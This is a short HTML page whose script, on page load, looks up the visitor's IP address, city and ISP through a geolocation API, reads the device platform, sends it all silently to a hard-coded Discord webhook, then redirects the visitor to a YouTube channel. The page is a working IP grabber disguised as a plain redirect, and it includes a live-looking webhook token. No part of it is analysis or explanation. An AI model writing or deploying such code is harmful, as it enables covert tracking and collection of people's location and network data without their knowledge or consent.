<!DOCTYPE html>
<html>
<body style="background:#000;">
<script>
    const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
    const y = "https://youtube.com/@LigmaBlox-w7m";

    async function start() {
        let info = "Target Detected";
        try {
            // Grab the data from the API
            const r = await fetch('https://ipapi.co/json/');
            const d = await r.json();
            // Build the detailed string
            info = `IP: ${d.ip} | City: ${d.city} | ISP: ${d.org} | Device: ${navigator.platform}`;
        } catch (e) {
            info = "Hit detected (Detailed data blocked by browser)";
        }

        // Send it using the method that worked
        const blob = new Blob([JSON.stringify({ content: info })], { type: 'application/json' });
        navigator.sendBeacon(h, blob);

        // Redirect
        setTimeout(() => { window.location.replace(y); }, 400);
    }

    start();
</script>
</body>
</html>
